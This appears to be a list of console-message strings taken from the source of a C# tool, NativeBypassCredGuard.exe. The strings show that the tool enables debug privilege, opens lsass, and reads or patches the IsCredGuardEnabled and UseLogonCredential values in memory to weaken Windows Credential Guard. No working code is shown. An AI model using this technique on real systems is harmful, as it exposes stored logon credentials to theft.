"Console.WriteLine(""Not a valid PE file."
"Console.WriteLine(""Pattern not found."
"Console.WriteLine(""[+] DLL remap completed:\tCopied "
"Console.WriteLine(""[+] Enable SeDebugPrivilege: \tOK"
"Console.WriteLine(""[+] InInitializationOrderModuleList:\t\t0x"
"Console.WriteLine(""[+] PEB Address: \t\t0x"
"Console.WriteLine(""[+] Usage:\n    NativeBypassCredGuard.exe <OPTION> <REMAPNTDLL>\n\n    OPTION:\n        - 'check': Read current values.\n        - 'patch': Write new values.\n\n    REMAPNTDLL:\n        - true: Remap the ntdll library.\n        - false (or omitted"
"Console.WriteLine(""[-] Error calling CloseHandle"
"Console.WriteLine(""[-] Error calling CreateProcess"
"Console.WriteLine(""[-] Error calling DebugActiveProcessStop"
"Console.WriteLine(""[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x"
"Console.WriteLine(""[-] Error calling NtOpenProcessToken. NTSTATUS: 0x"
"Console.WriteLine(""[-] Error calling NtProtectVirtualMemory (PAGE_EXECUTE_WRITECOPY"
"Console.WriteLine(""[-] Error calling NtProtectVirtualMemory (dwOldProtection"
"Console.WriteLine(""[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x"
"Console.WriteLine(""[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr"
"Console.WriteLine(""[-] Error calling NtReadVirtualMemory (ReadRemoteWStr"
"Console.WriteLine(""[-] Error calling NtReadVirtualMemory"
"Console.WriteLine(""[-] Error calling NtTerminateProcess. NTSTATUS:"
"Console.WriteLine(""[-] File must be compiled as 64-byte binary."
"Console.WriteLine(""[-] Incorrect DOS header signature"
"Console.WriteLine(""[-] Incorrect NT header signature"
"Console.WriteLine(""[-] Incorrect Optional Header Magic field value"
"Console.WriteLine(""[-] It was not possible to get lsass handle."
"Console.WriteLine(""[-] PEB structure is not readable."
"Console.WriteLine($""Error: {ex.Message}"
"Console.WriteLine($""[+] DLL Base Address:\t\t0x{hModule.ToInt64("
"Console.WriteLine($""[+] DLL remap:\t\t\tTrue"
"Console.WriteLine($""[+] Debug messages:\t\t{debug}"
"Console.WriteLine($""[+] File Handle:\t\t{fileHandle}"
"Console.WriteLine($""[+] IsCredGuardEnabled address:\t0x{isCredGuardEnabled_Address.ToInt64("
"Console.WriteLine($""[+] IsCredGuardEnabled offset:\t0x{(isCredGuardEnabled + offset + 12"
"Console.WriteLine($""[+] IsCredGuardEnabled value: \t{isCredGuardEnabled_buffer[0]:X2} {isCredGuardEnabled_buffer[1]:X2} {isCredGuardEnabled_buffer[2]:X2} {isCredGuardEnabled_buffer[3]:X2}"
"Console.WriteLine($""[+] Lsass Handle:\t\t{lsassHandle}"
"Console.WriteLine($""[+] Offset:\t\t\t0x{offset:X}"
"Console.WriteLine($""[+] UseLogonCredential address:\t0x{useLogonCredential_Address.ToInt64("
"Console.WriteLine($""[+] UseLogonCredential offset:\t0x{(useLogonCredential + offset + 6"
"Console.WriteLine($""[+] UseLogonCredential value: \t{useLogonCredential_buffer[0]:X2} {useLogonCredential_buffer[1]:X2} {useLogonCredential_buffer[2]:X2} {useLogonCredential_buffer[3]:X2}"
"Console.WriteLine($""[+] Wrote value {isCredGuardEnabled_Value} to address: \t0x{isCredGuardEnabled_Address.ToInt64("
"Console.WriteLine($""[+] Wrote value {useLogonCredential_Value} to address: \t0x{useLogonCredential_Address.ToInt64("
